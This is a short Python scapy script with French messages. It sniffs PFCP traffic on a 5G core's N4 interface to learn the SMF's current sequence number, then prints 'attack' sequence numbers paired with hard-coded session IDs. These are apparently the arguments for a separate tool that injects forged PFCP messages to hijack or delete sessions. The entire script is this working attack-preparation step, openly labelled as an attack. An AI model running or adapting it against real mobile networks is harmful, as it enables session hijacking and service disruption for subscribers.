from scapy.all import sniff
from scapy.contrib.pfcp import PFCP
from scapy.layers.inet import IP, UDP

SMF_IP   = "10.10.4.102"
IFACE    = "n4"
DURATION = 3

print(f"[*] Capture {DURATION}s sur {IFACE} pour synchroniser le SEQ...")

max_seq = 0
def process(p):
    global max_seq
    try:
        if IP in p and UDP in p and PFCP in p:
            if p[UDP].dport == 8805 or p[UDP].sport == 8805:
                if p[IP].src == SMF_IP:
                    if p[PFCP].seq > max_seq:
                        max_seq = p[PFCP].seq
    except:
        pass

sniff(iface=IFACE, prn=process, timeout=DURATION, store=False)

print(f"[+] SEQ courant SMF2 : {max_seq}")
print(f"[+] SEQ attaque      : {max_seq + 1}")
print(f"\nArguments a utiliser :")
seids = ["0x3a", "0xb6b", "0x4f4", "0xab6"]
args = " ".join([f"{s}:{max_seq+1+i}:8805" for i, s in enumerate(seids)])
print(f"  {args}")
